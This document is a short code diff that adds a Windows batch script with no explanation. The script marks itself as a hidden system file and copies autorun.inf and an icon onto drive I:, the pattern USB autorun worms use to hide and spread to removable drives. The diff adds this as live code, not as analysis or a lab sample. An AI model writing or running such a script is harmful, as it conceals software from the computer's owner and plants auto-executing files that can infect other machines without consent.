@@ -1,0 +1,4 @@
+@echo off
+attrib +s +h %0
+xcopy "autorun.inf" "I:\" /s
+xcopy "autorun.ico" "I:\" /s
